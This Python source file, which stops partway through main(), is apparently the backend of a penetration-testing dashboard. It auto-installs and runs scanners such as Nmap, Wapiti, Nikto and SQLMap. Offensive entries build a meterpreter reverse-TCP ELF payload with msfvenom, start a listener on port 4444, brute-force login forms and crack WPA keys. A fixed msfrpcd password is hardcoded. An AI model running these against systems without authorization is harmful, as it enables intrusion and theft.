#!/usr/bin/env python3
"""
AuditX Backend Orchestrator
Handles tool detection, auto-install, and execution.
Outputs structured JSON lines for the Quickshell frontend.
"""

import sys
import os
import json
import subprocess
import shutil
import threading
import time
import argparse
import re
import socket

# Ensure user local bin is in PATH for pip-installed binaries
local_bin = os.path.expanduser("~/.local/bin")
if local_bin not in os.environ.get("PATH", "").split(os.pathsep):
    os.environ["PATH"] = local_bin + os.pathsep + os.environ.get("PATH", "")

def _normalize_url(target: str) -> str:
    """Ensure target URL has a valid scheme (http/https) for scanners like Wapiti."""
    target = (target or "").strip()
    if not target:
        return "http://localhost"
    if not (target.startswith("http://") or target.startswith("https://")):
        return f"http://{target}"
    return target

# ─── Wapiti Attack Modules (34 Modules) ───────────────────────────────────────
WAPITI_MODULES = {
    "backup": "Search backup copies of scripts and archives on web server",
    "brute_login_form": "Brute-force login forms using common credentials wordlist",
    "buster": "Brute-force file and directory paths (DirBuster-style exploration)",
    "cms": "Detect Content Management Systems (CMS) and version vulnerabilities",
    "cookieflags": "Check cookie security flags (Secure, HttpOnly, SameSite)",
    "crlf": "Detect Carriage Return Line Feed (CRLF) / HTTP response splitting",
    "csp": "Evaluate Content Security Policy (CSP) presence and configuration",
    "csrf": "Detect forms missing Cross-Site Request Forgery (CSRF) protections",
    "exec": "Detect Remote Code Execution (RCE) and system command injection",
    "file": "Detect Path Traversal, Local and Remote File Inclusion (LFI/RFI)",
    "htaccess": "Bypass authorization controls via custom HTTP verbs and headers",
    "htp": "Fingerprint web technologies using HashThePlanet database",
    "http_headers": "Audit HTTP security headers (HSTS, X-Content-Type-Options, etc.)",
    "https_redirect": "Verify strict redirection from insecure HTTP to HTTPS",
    "ldap": "Detect error-based and boolean-based LDAP injection flaws",
    "log4shell": "Detect Apache Log4Shell remote code execution (CVE-2021-44228)",
    "methods": "Audit uncommon or dangerous HTTP methods (PUT, DELETE, OPTIONS)",
    "network_device": "Detect specialized network devices, firewalls, and appliances",
    "nikto": "Brute-force known vulnerable scripts using Nikto rules database",
    "permanentxss": "Detect stored (persistent) Cross-Site Scripting (XSS)",
    "printer": "Detect networked printer interfaces and firmware disclosure",
    "redirect": "Detect unvalidated redirect parameters and open relay vectors",
    "shellshock": "Detect GNU Bash Shellshock execution vulnerability (CVE-2014-6271)",
    "spring4shell": "Detect Spring Framework RCE vulnerability (CVE-2022-22965)",
    "sql": "Detect SQL and XPath injection via error-based and boolean techniques",
    "ssl": "Audit SSL/TLS certificates, cipher suites, and protocol security",
    "ssrf": "Detect Server-Side Request Forgery (SSRF) vulnerabilities",
    "takeover": "Detect dangling DNS records and unclaimed CNAME takeovers",
    "timesql": "Detect blind SQL injection using time-delay inference",
    "upload": "Detect unrestricted arbitrary file upload vulnerabilities",
    "wapp": "Fingerprint web stack technologies and map to known CVEs",
    "wp_enum": "Enumerate WordPress themes, plugins, and vulnerable versions",
    "xss": "Detect reflected Cross-Site Scripting in query parameters and forms",
    "xxe": "Detect XML External Entity (XXE) injection vulnerabilities",
}

# ─── Tool Definitions ────────────────────────────────────────────────────────

TOOLS = {
    "sherlock": {
        "display": "Sherlock",
        "category": "OSINT",
        "description": "Username hunt across social networks",
        # sherlock-project installs binary as "sherlock"
        "check": ["sherlock"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "sherlock-project"],
        "input_type": "username",
        "build_cmd": lambda target, opts: ["sherlock", "--print-found", "--no-color", "--output", "/tmp/sherlock_out.txt", target],
        "parse": "sherlock",
    },
    "theharvester": {
        "display": "theHarvester",
        "category": "OSINT",
        "description": "Collect emails, subdomains, and IPs from a domain",
        # Binary name varies: "theHarvester" (Arch/Kali package) or "theharvester" (pip install)
        "check": ["theHarvester", "theharvester"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "theHarvester"],
        "input_type": "domain",
        "build_cmd": lambda target, opts: [_find_binary(["theHarvester", "theharvester"]), "-d", target, "-b", "all", "-f", "/tmp/harvester_out"],
        "parse": "theharvester",
    },
    "sublist3r": {
        "display": "Sublist3r",
        "category": "OSINT",
        "description": "Fast subdomains enumeration",
        # Sublist3r binary is typically "sublist3r" — install via pacman or pip
        "check": ["sublist3r", "Sublist3r"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "sublist3r"],
        "input_type": "domain",
        "build_cmd": lambda target, opts: [_find_binary(["sublist3r", "Sublist3r"]) or "sublist3r", "-d", target, "-o", "/tmp/sublist3r_out.txt"],
        "parse": "sublist3r",
    },
    "nmap": {
        "display": "Nmap",
        "category": "Network",
        "description": "Port scanning and service detection",
        "check": ["nmap"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "nmap"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["nmap", "-sV", "--open", "-oX", "/tmp/nmap_out.xml", target],
        "parse": "nmap",
    },
    "rustscan": {
        "display": "RustScan",
        "category": "Network",
        "description": "Ultra-fast port scanner",
        "check": ["rustscan"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "rustscan"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["rustscan", "-a", target, "--", "-sV"],
        "parse": "generic",
    },
    "nikto": {
        "display": "Nikto",
        "category": "Web",
        "description": "Web server vulnerability scanner",
        "check": ["nikto"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "nikto"],
        "input_type": "url",
        "build_cmd": lambda target, opts: ["nikto", "-h", target, "-Format", "json", "-output", "/tmp/nikto_out.json"],
        "parse": "nikto",
    },
    "whatweb": {
        "display": "WhatWeb",
        "category": "Web",
        "description": "Web technology fingerprinting",
        "check": ["whatweb"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "whatweb"],
        "input_type": "url",
        "build_cmd": lambda target, opts: ["whatweb", "--log-json=/tmp/whatweb_out.json", target],
        "parse": "whatweb",
    },
    "sqlmap": {
        "display": "SQLMap",
        "category": "Web",
        "description": "Automatic SQL injection detection",
        "check": ["sqlmap"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "sqlmap"],
        "input_type": "url",
        "build_cmd": lambda target, opts: ["sqlmap", "-u", target, "--batch", "--output-dir=/tmp/sqlmap_out"],
        "parse": "generic",
    },
    "wapiti": {
        "display": "Wapiti (All 34 Modules)",
        "category": "Wapiti",
        "description": "Full web vulnerability scanner loaded with all 34 attack modules (-m all)",
        "check": ["wapiti", "wapiti3"],
        "install_cmd": ["bash", "-c", "pipx install wapiti3 || pip3 install --user --break-system-packages wapiti3"],
        "input_type": "url",
        "build_cmd": lambda target, opts: [
            "wapiti",
            "-u", _normalize_url(target),
            "-m", opts.get("modules", "all"),
            "--flush-session",
            "--no-bugreport",
            "-f", "json",
            "-o", "/tmp/wapiti_out.json"
        ],
        "parse": "generic",
    },
    "metasploit": {
        "display": "Metasploit Aux",
        "category": "Network",
        "description": "Metasploit auxiliary service & SMB fingerprinting scanner",
        "check": ["msfconsole"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "metasploit"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: [
            "msfconsole", "-q", "-x",
            f"use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set PORTS 21,22,80,443,445,3389,8080; run; use auxiliary/scanner/smb/smb_version; set RHOSTS {target}; run; exit"
        ],
        "parse": "generic",
    },
    "msf_rpc": {
        "display": "Metasploit RPC",
        "category": "Exploit/Audit",
        "description": "Metasploit MSFRPC API Orchestrator (Auxiliary Scanners via msfrpcd)",
        "check": ["msfconsole", "msfrpcd"],
        "install_cmd": ["pip3", "install", "--user", "--break-system-packages", "pymetasploit3"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["msf_rpc", target],
        "parse": "generic",
    },
    "msfvenom": {
        "display": "Msfvenom Payload",
        "category": "Exploit/Audit",
        "description": "Generate Linux meterpreter reverse TCP payload (/tmp/payload.elf)",
        "check": ["msfvenom"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "metasploit"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: [
            "msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp",
            f"LHOST={target}", "LPORT=4444", "-f", "elf", "-o", "/tmp/payload.elf"
        ],
        "parse": "generic",
    },
    "nuclei": {
        "display": "Nuclei",
        "category": "Vulnerability",
        "description": "Fast and customizable vulnerability scanner based on simple YAML based DSL.",
        "check": ["nuclei"],
        "install_cmd": ["bash", "-c", "curl -sL https://github.com/projectdiscovery/nuclei/releases/download/v3.3.2/nuclei_3.3.2_linux_amd64.zip -o /tmp/nuclei.zip && unzip -o /tmp/nuclei.zip -d ~/.local/bin/ nuclei && chmod +x ~/.local/bin/nuclei"],
        "input_type": "url",
        "build_cmd": lambda target, opts: [
            "nuclei", "-u", target, "-no-color",
            "-severity", "low,medium,high,critical",
            "-timeout", "10", "-retries", "1"
        ],
        "parse": "generic",
    },
    "msf_listener": {
        "display": "MSF Listener",
        "category": "Exploit/Audit",
        "description": "Start a reverse TCP listener (linux/x64/meterpreter/reverse_tcp)",
        "check": ["msfconsole"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "metasploit"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: [
            "msfconsole", "-q", "-x",
            "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
        ],
        "parse": "generic",
    },
    "gobuster": {
        "display": "Gobuster",
        "category": "Web",
        "description": "Directory and file busting tool",
        "check": ["gobuster"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "gobuster"],
        "input_type": "url",
        "build_cmd": lambda target, opts: [
            "gobuster", "dir", "-u", target,
            "-w", os.path.expanduser("~/wordlists/common.txt") if os.path.exists(os.path.expanduser("~/wordlists/common.txt")) else "/usr/share/wordlists/dirb/common.txt",
            "-q", "-t", "10"
        ],
        "parse": "generic",
    },
    "netexec": {
        "display": "NetExec (CME)",
        "category": "Network",
        "description": "Swiss army knife for pentesting Active Directory / SMB environments",
        "check": ["netexec"],
        "install_cmd": ["bash", "-c", "sudo pacman -S --noconfirm --needed python-pipx rust cargo && pipx install git+https://github.com/Pennyw0rth/NetExec.git"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["netexec", "smb", target, "--shares", "--verbose", "--no-progress"],
        "parse": "generic",
    },
    "enum4linux-ng": {
        "display": "Enum4Linux-NG",
        "category": "Network",
        "description": "Next gen Windows/Samba enumeration tool",
        "check": ["enum4linux-ng.py", "enum4linux-ng"],
        "install_cmd": ["bash", "-c", "curl -sL https://raw.githubusercontent.com/cddmp/enum4linux-ng/master/enum4linux-ng.py -o ~/.local/bin/enum4linux-ng && chmod +x ~/.local/bin/enum4linux-ng && pip3 install --user --break-system-packages impacket"],
        "input_type": "ip",
        "build_cmd": lambda target, opts: ["enum4linux-ng", "-A", target],
        "parse": "generic",
    },
    "gitleaks": {
        "display": "Gitleaks",
        "category": "OSINT",
        "description": "Secret and credential leak scanner for git repositories/directories",
        "check": ["gitleaks"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "gitleaks"],
        "input_type": "path",
        "build_cmd": lambda target, opts: ["gitleaks", "dir", target, "-v", "--no-color"],
        "parse": "generic",
    },
    "scoutsuite": {
        "display": "ScoutSuite",
        "category": "Cloud",
        "description": "Multi-cloud security posture auditing (AWS, GCP, Azure, Alibaba)",
        "check": ["scout", "scoutsuite"],
        "install_cmd": ["bash", "-c", "pipx install scoutsuite || pip3 install --user --break-system-packages scoutsuite"],
        "input_type": "cloud",
        "build_cmd": lambda target, opts: [
            _find_binary(["scout", "scoutsuite"]),
            target.lower().strip() if target.lower().strip() in ["aws", "azure", "gcp", "aliyun", "oci"] else "aws",
            "--no-browser",
            "--report-dir", "/tmp/scoutsuite_report"
        ],
        "parse": "generic",
    },
    "prowler": {
        "display": "Prowler",
        "category": "Cloud",
        "description": "Cloud security assessment & CIS benchmark tool (AWS, Azure, GCP)",
        "check": ["prowler"],
        "install_cmd": ["bash", "-c", "pip3 install --user --break-system-packages prowler"],
        "input_type": "cloud",
        "build_cmd": lambda target, opts: [
            "prowler",
            target.lower().strip() if target.lower().strip() in ["aws", "azure", "gcp", "kubernetes"] else "aws",
            "-M", "csv,json",
            "-F", "/tmp/prowler_out"
        ],
        "parse": "generic",
    },
    "pacu": {
        "display": "Pacu",
        "category": "Cloud",
        "description": "AWS cloud security exploitation and post-exploitation framework",
        "check": ["pacu"],
        "install_cmd": ["bash", "-c", "pipx install pacu || pip3 install --user --break-system-packages pacu"],
        "input_type": "cloud",
        "build_cmd": lambda target, opts: [
            "pacu",
            "--session", target.strip() if target.strip() else "auditx_session"
        ],
        "parse": "generic",
    },
    "trivy": {
        "display": "Trivy Cloud",
        "category": "Cloud",
        "description": "Cloud & IaC security scanner (AWS accounts, Kubernetes, Terraform)",
        "check": ["trivy"],
        "install_cmd": ["bash", "-c", "curl -sL https://github.com/aquasecurity/trivy/releases/download/v0.76.0/trivy_0.76.0_Linux-64bit.tar.gz -o /tmp/trivy.tar.gz && tar -xzf /tmp/trivy.tar.gz -C ~/.local/bin/ trivy && chmod +x ~/.local/bin/trivy"],
        "input_type": "cloud",
        "build_cmd": lambda target, opts: (
            ["trivy", target.lower().strip()]
            if target.lower().strip() in ["aws", "k8s", "kubernetes"]
            else ["trivy", "misconfig", target.strip() if target.strip() else ".", "--format", "table"]
        ),
        "parse": "generic",
    },
    "checkov": {
        "display": "Checkov",
        "category": "Cloud",
        "description": "Static code analysis for cloud IaC (Terraform, K8s, CloudFormation)",
        "check": ["checkov"],
        "install_cmd": ["bash", "-c", "pipx install checkov || pip3 install --user --break-system-packages checkov"],
        "input_type": "path",
        "build_cmd": lambda target, opts: [
            "checkov",
            "-d", target.strip() if target.strip() and os.path.isdir(target.strip()) else ".",
            "--compact"
        ],
        "parse": "generic",
    },
    "aircrack-ng": {
        "display": "Aircrack-ng",
        "category": "Wireless",
        "description": "802.11 WEP/WPA/WPA2 key cracker from handshake captures",
        "check": ["aircrack-ng"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "aircrack-ng"],
        "input_type": "path",
        "build_cmd": lambda target, opts: [
            "aircrack-ng",
            target.strip() if target.strip() else "/tmp/handshake.cap"
        ],
        "parse": "generic",
    },
    "airodump-ng": {
        "display": "Airodump-ng",
        "category": "Wireless",
        "description": "Packet sniffer & live wireless network monitor (BSSID, channel, encryption)",
        "check": ["airodump-ng"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "aircrack-ng"],
        "input_type": "interface",
        "build_cmd": lambda target, opts: [
            "airodump-ng",
            "--write", "/tmp/auditx_airodump",
            "--output-format", "csv",
            target.strip() if target.strip() else "wlp0s20f3"
        ],
        "parse": "generic",
    },
    "airmon-ng": {
        "display": "Airmon-ng",
        "category": "Wireless",
        "description": "Manage wireless card monitor mode & check conflicting processes",
        "check": ["airmon-ng"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "aircrack-ng"],
        "input_type": "interface",
        "build_cmd": lambda target, opts: [
            "airmon-ng",
            "start", target.strip() if target.strip() else "wlp0s20f3"
        ],
        "parse": "generic",
    },
    "wifite": {
        "display": "Wifite",
        "category": "Wireless",
        "description": "Automated wireless auditor (attacks WEP, WPA handshakes & PMKID)",
        "check": ["wifite"],
        "install_cmd": ["pipx", "install", "git+https://github.com/derv82/wifite2.git"],
        "input_type": "interface",
        "build_cmd": lambda target, opts: [
            "wifite",
            "-i", target.strip() if target.strip() else "wlp0s20f3",
            "--kill",
            "--nodeauth"
        ],
        "parse": "generic",
    },
    "kismet": {
        "display": "Kismet",
        "category": "Wireless",
        "description": "Wireless network detector, packet sniffer, and wardriving IDS",
        "check": ["kismet"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "kismet"],
        "input_type": "interface",
        "build_cmd": lambda target, opts: [
            "kismet",
            "-c", target.strip() if target.strip() else "wlp0s20f3",
            "--no-interactive",
            "--log-title", "auditx_kismet"
        ],
        "parse": "generic",
    },
    "jadx": {
        "display": "Jadx Decompiler",
        "category": "Reverse Eng",
        "description": "Dex to Java decompiler and Android APK source extractor",
        "check": ["jadx"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "jadx"],
        "input_type": "path",
        "build_cmd": lambda target, opts: [
            "jadx",
            "-d", "/tmp/auditx_jadx_out",
            "--show-bad-code",
            target.strip() if target.strip() else "."
        ],
        "parse": "generic",
    },
    "apktool": {
        "display": "Apktool",
        "category": "Reverse Eng",
        "description": "Disassemble and decode Android APK resources, manifest, and smali code",
        "check": ["apktool"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "apktool"],
        "input_type": "path",
        "build_cmd": lambda target, opts: [
            "apktool", "d", "-f",
            "-o", "/tmp/auditx_apktool_out",
            target.strip() if target.strip() else "."
        ],
        "parse": "generic",
    },
    "binwalk": {
        "display": "Binwalk",
        "category": "Reverse Eng",
        "description": "Firmware analysis tool & embedded file signature scanner",
        "check": ["binwalk"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "binwalk"],
        "input_type": "path",
        "build_cmd": lambda target, opts: [
            "binwalk",
            "-B",
            target.strip() if target.strip() else "."
        ],
        "parse": "generic",
    },
    "radare2": {
        "display": "Radare2 (r2)",
        "category": "Reverse Eng",
        "description": "UNIX-like reverse engineering framework (binary headers, symbols, strings)",
        "check": ["rabin2", "r2", "radare2"],
        "install_cmd": ["sudo", "pacman", "-S", "--noconfirm", "radare2"],
        "input_type": "path",
        "build_cmd": lambda target, opts: [
            "rabin2",
            "-I", "-z",
            target.strip() if target.strip() else "."
        ],
        "parse": "generic",
    },
}

# Automatically register all 34 individual Wapiti attack modules
for _mod_name, _mod_desc in WAPITI_MODULES.items():
    _display_title = _mod_name.replace('_', ' ').title()
    TOOLS[f"wapiti_{_mod_name}"] = {
        "display": f"Wapiti: {_display_title}",
        "category": "Wapiti",
        "description": _mod_desc,
        "check": ["wapiti", "wapiti3"],
        "install_cmd": ["bash", "-c", "pipx install wapiti3 || pip3 install --user --break-system-packages wapiti3"],
        "input_type": "url",
        "build_cmd": (lambda m=_mod_name: (lambda target, opts: [
            "wapiti",
            "-u", _normalize_url(target),
            "-m", m,
            "--flush-session",
            "--no-bugreport",
            "-f", "json",
            "-o", f"/tmp/wapiti_{m}_out.json"
        ]))(),
        "parse": "generic",
    }

# ─── Output Helpers ───────────────────────────────────────────────────────────

def emit(event: str, **kwargs):
    """Emit a structured JSON line to stdout."""
    payload = {"event": event, "ts": time.time(), **kwargs}
    print(json.dumps(payload), flush=True)

# ─── Binary helpers ───────────────────────────────────────────────────────────

def _find_binary(candidates) -> str:
    """Return the first candidate binary name found in PATH, or the first candidate as fallback."""
    if isinstance(candidates, str):
        candidates = [candidates]
    for c in candidates:
        if shutil.which(c):
            return c
    return candidates[0]

# ─── Tool Detection & Install ─────────────────────────────────────────────────

def check_tool(name: str) -> bool:
    """Check if any of the tool's known binary names exist in PATH."""
    meta = TOOLS.get(name, {})
    candidates = meta.get("check", [name])
    if isinstance(candidates, str):
        candidates = [candidates]
    return any(shutil.which(c) is not None for c in candidates)

def get_tool_status() -> dict:
    return {name: check_tool(name) for name in TOOLS}

def install_tool(name: str):
    meta = TOOLS.get(name)
    if not meta:
        emit("install_error", tool=name, message="Unknown tool")
        return False
    emit("install_start", tool=name)
    cmd = meta["install_cmd"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode == 0:
            emit("install_done", tool=name, success=True)
            return True
        else:
            emit("install_done", tool=name, success=False, message=proc.stderr[:500])
            return False
    except subprocess.TimeoutExpired:
        emit("install_done", tool=name, success=False, message="Timeout during install")
        return False
    except Exception as e:
        emit("install_done", tool=name, success=False, message=str(e))
        return False

# ─── Execution ────────────────────────────────────────────────────────────────

def run_msf_rpc(target: str):
    tool_name = "msf_rpc"
    emit("tool_start", tool=tool_name, cmd=f"msfrpcd API client -> target: {target}")
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
    except ImportError:
        emit("tool_error", tool=tool_name, message="pymetasploit3 library missing. Run `pip3 install pymetasploit3`")
        return False

    pass_code = "auditx_secret"
    port = 55553
    client = None

    emit("tool_output", tool=tool_name, line="[*] Connecting to MSF RPC Daemon on 127.0.0.1:55553...")
    try:
        client = MsfRpcClient(pass_code, port=port, ssl=True)
    except Exception:
        emit("tool_output", tool=tool_name, line="[*] Daemon not active, starting msfrpcd daemon...")
        subprocess.Popen(["msfrpcd", "-P", pass_code, "-a", "127.0.0.1", "-p", str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for attempt in range(12):
            time.sleep(1.5)
            try:
                client = MsfRpcClient(pass_code, port=port, ssl=True)
                break
            except Exception:
                pass

    if not client:
        emit("tool_error", tool=tool_name, message="Could not connect to MSF RPC Daemon after startup")
        return False

    emit("tool_output", tool=tool_name, line="[+] Successfully authenticated to MSF RPC Daemon!")
    try:
        mod_count = len(client.modules.auxiliary)
        emit("tool_output", tool=tool_name, line=f"[*] Loaded Auxiliary Modules: {mod_count}")
    except Exception:
        pass

    scans = [
        ("auxiliary/scanner/portscan/tcp", {"RHOSTS": target, "PORTS": "21,22,80,443,445,3389,8080"}),
        ("auxiliary/scanner/http/http_version", {"RHOSTS": target}),
        ("auxiliary/scanner/smb/smb_version", {"RHOSTS": target}),
    ]

    for mod_name, opts in scans:
        emit("tool_output", tool=tool_name, line=f"[*] Executing MSF RPC Module: {mod_name}...")
        try:
            mod = client.modules.use('auxiliary', mod_name)
            job = mod.execute(**opts)
            job_id = job.get('job_id')
            emit("tool_output", tool=tool_name, line=f"[+] Job {job_id} launched for {mod_name}")
            
            start_t = time.time()
            while time.time() - start_t < 15:
                if str(job_id) not in client.jobs.list:
                    emit("tool_output", tool=tool_name, line=f"[+] Module {mod_name} execution completed.")
                    break
                time.sleep(1)
        except Exception as e:
            emit("tool_output", tool=tool_name, line=f"[!] Error running module {mod_name}: {e}")

    emit("tool_done", tool=tool_name, exit_code=0)
    return True

def stream_process(tool_name: str, cmd: list, timeout: int = 300):
    """Run a subprocess and stream stdout/stderr line by line."""
    emit("tool_start", tool=tool_name, cmd=" ".join(cmd))
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        for line in iter(proc.stdout.readline, ""):
            line = line.rstrip()
            if line:
                emit("tool_output", tool=tool_name, line=line)
        proc.wait(timeout=timeout)
        code = proc.returncode
        emit("tool_done", tool=tool_name, exit_code=code)
        return code == 0
    except FileNotFoundError:
        emit("tool_error", tool=tool_name, message=f"Command not found: {cmd[0]}")
        return False
    except subprocess.TimeoutExpired:
        proc.kill()
        emit("tool_error", tool=tool_name, message="Execution timeout")
        return False
    except Exception as e:
        emit("tool_error", tool=tool_name, message=str(e))
        return False

def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def run_network_recon(target: str = ""):
    tool_name = "network_recon"
    my_ip = get_local_ip()

    if target and target.strip():
        chosen_subnet = target.strip()
    elif my_ip != '127.0.0.1':
        chosen_subnet = ".".join(my_ip.split('.')[:-1]) + ".0/24"
    else:
        chosen_subnet = ""

    emit("recon_result", local_ip=my_ip, subnet=chosen_subnet)

    if not chosen_subnet:
        emit("tool_start", tool=tool_name, cmd=f"Network Recon (Local IP: {my_ip})")
        emit("tool_output", tool=tool_name, line="[*] Initiating Network Recon...")
        emit("tool_output", tool=tool_name, line=f"[+] Local IP Address: {my_ip}")
        emit("tool_output", tool=tool_name, line="[!] Loopback IP detected (127.0.0.1). Skipping subnet discovery.")
        emit("tool_done", tool=tool_name, exit_code=0)
        return

    has_nmap = shutil.which("nmap") is not None
    has_arpscan = shutil.which("arp-scan") is not None

    if has_nmap:
        cmd = ["nmap", "-sn", chosen_subnet]
        stream_process(tool_name, cmd)
    elif has_arpscan:
        cmd = ["sudo", "arp-scan", "--localnet"]
        stream_process(tool_name, cmd)
    else:
        emit("tool_start", tool=tool_name, cmd=f"Network Recon (Local IP: {my_ip})")
        emit("tool_error", tool=tool_name, message="Neither 'nmap' nor 'arp-scan' is installed on this system.")
        emit("tool_done", tool=tool_name, exit_code=1)

def run_tool(tool_name: str, target: str, opts: dict = None):
    if opts is None:
        opts = {}
    if tool_name in ["network_recon", "recon"]:
        run_network_recon(target)
        return

    meta = TOOLS.get(tool_name)
    if not meta:
        emit("tool_error", tool=tool_name, message="Unknown tool")
        return

    if not check_tool(tool_name):
        emit("tool_missing", tool=tool_name)
        installed = install_tool(tool_name)
        if not installed:
            return

    if tool_name == "msf_rpc":
        run_msf_rpc(target)
    elif tool_name == "msf_listener":
        cmd = meta["build_cmd"](target, opts)
        stream_process(tool_name, cmd, timeout=3600)
    elif tool_name == "nuclei":
        cmd = meta["build_cmd"](target, opts)
        stream_process(tool_name, cmd, timeout=1800)
    elif tool_name == "wapiti" or tool_name.startswith("wapiti_"):
        cmd = meta["build_cmd"](target, opts)
        stream_process(tool_name, cmd, timeout=1800)
        # Parse output json if generated and emit structured lines
        out_json = f"/tmp/{tool_name}_out.json" if tool_name.startswith("wapiti_") else "/tmp/wapiti_out.json"
        if os.path.exists(out_json):
            try:
                with open(out_json, "r", encoding="utf-8") as f:
                    wdata = json.load(f)
                vulns = wdata.get("vulnerabilities", {})
                found_count = 0
                for vname, vlist in vulns.items():
                    if vlist:
                        for item in vlist:
                            found_count += 1
                            info = item.get("info", "") or item.get("parameter", "") or item.get("path", "")
                            emit("tool_output", tool=tool_name, line=f"[+] Wapiti Vuln: {vname} - {info}")
                if found_count == 0:
                    emit("tool_output", tool=tool_name, line=f"[*] Wapiti ({tool_name}) scan completed: No vulnerabilities detected.")
            except Exception as e:
                emit("tool_output", tool=tool_name, line=f"[*] Wapiti report parsing note: {e}")
    else:
        cmd = meta["build_cmd"](target, opts)
        stream_process(tool_name, cmd)

def resolve_target_for_tool(tool_name: str, fallback_target: str, targets: dict = None) -> str:
    """Resolve specific target for a tool based on its input_type and supplied targets."""
    if targets is None:
        targets = {}
    meta = TOOLS.get(tool_name, {})
    itype = meta.get("input_type", "ip").lower()

    if itype in ["cloud", "provider"]:
        val = targets.get("cloud") or targets.get("provider")
        if val and val.strip():
            return val.strip()
        if fallback_target and fallback_target.strip():
            return fallback_target.strip()
        return "aws"

    if itype in ["path", "directory", "dir"]:
        val = targets.get("path")
        if val and val.strip():
            return val.strip()
        if fallback_target and os.path.exists(fallback_target.strip()):
            return fallback_target.strip()
        return "."

    if itype in ["user", "username"]:
        val = targets.get("username") or targets.get("user")
        if val and val.strip():
            return val.strip()
        if fallback_target and fallback_target.strip():
            return fallback_target.strip()
        return "admin"

    if itype == "url":
        val = targets.get("url")
        if val and val.strip():
            return val.strip()
        dom = targets.get("domain")
        if dom and dom.strip():
            return f"https://{dom.strip()}"
        ip = targets.get("ip")
        if ip and ip.strip():
            return f"http://{ip.strip()}"
        if fallback_target and fallback_target.strip():
            fb = fallback_target.strip()
            if not fb.startswith(("http://", "https://")):
                return f"https://{fb}"
            return fb
        return ""

    if itype == "domain":
        val = targets.get("domain")
        if val and val.strip():
            return val.strip()
        url = targets.get("url")
        if url and url.strip():
            cleaned = re.sub(r"^https?://", "", url.strip()).split("/")[0].split(":")[0]
            if cleaned:
                return cleaned
        ip = targets.get("ip")
        if ip and ip.strip():
            return ip.strip()
        if fallback_target and fallback_target.strip():
            cleaned = re.sub(r"^https?://", "", fallback_target.strip()).split("/")[0].split(":")[0]
            return cleaned
        return ""

    if itype in ["interface", "wlan", "wifi"]:
        val = targets.get("interface") or targets.get("wlan")
        if val and val.strip():
            return val.strip()
        if fallback_target and fallback_target.strip():
            return fallback_target.strip()
        return "wlp0s20f3"

    # itype == "ip" or fallback
    val = targets.get("ip")
    if val and val.strip():
        return val.strip()
    dom = targets.get("domain")
    if dom and dom.strip():
        return dom.strip()
    url = targets.get("url")
    if url and url.strip():
        cleaned = re.sub(r"^https?://", "", url.strip()).split("/")[0].split(":")[0]
        if cleaned:
            return cleaned
    if fallback_target and fallback_target.strip():
        return fallback_target.strip()
    return ""

def run_full_audit(target: str, tools: list, targets: dict = None):
    emit("audit_start", target=target, tools=tools, targets=targets or {})
    for tool_name in tools:
        specific_target = resolve_target_for_tool(tool_name, target, targets)
        run_tool(tool_name, specific_target)
    emit("audit_done", target=target)

# ─── Entry Point ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="AuditX Backend")
    sub = parser.add_subparsers(dest="cmd")

    # Status command
    sub.add_parser("status", help="Check which tools are installed")

    # Run single tool
    run_p = sub.add_parser("run", help="Run a single tool")
    run_p.add_argument("tool", help="Tool name")
    run_p.add_argument("target", help="Target (IP/domain/URL/username/cloud/path/interface)")
    run_p.add_argument("--modules", "--wapiti-modules", default="all", help="Modules to run for tools like Wapiti (default: all)")

    # Wapiti Modules inspection
    sub.add_parser("wapiti-modules", help="List all 30 Wapiti attack modules with descriptions")

    # Full audit
    audit_p = sub.add_parser("audit", help="Run all/selected tools")
    audit_p.add_argument("target", nargs="?", default="", help="Primary target")
    audit_p.add_argument("--tools", nargs="+", default=list(TOOLS.keys()))
    audit_p.add_argument("--targets", help="JSON encoded targets by type (ip, domain, url, cloud, path, username, interface)")
    audit_p.add_argument("--ip", help="Target IP / subnet")
    audit_p.add_argument("--domain", help="Target domain")
    audit_p.add_argument("--url", help="Target URL")
    audit_p.add_argument("--cloud", help="Target cloud provider")
    audit_p.add_argument("--path", help="Target path / repository")
    audit_p.add_argument("--user", help="Target username")
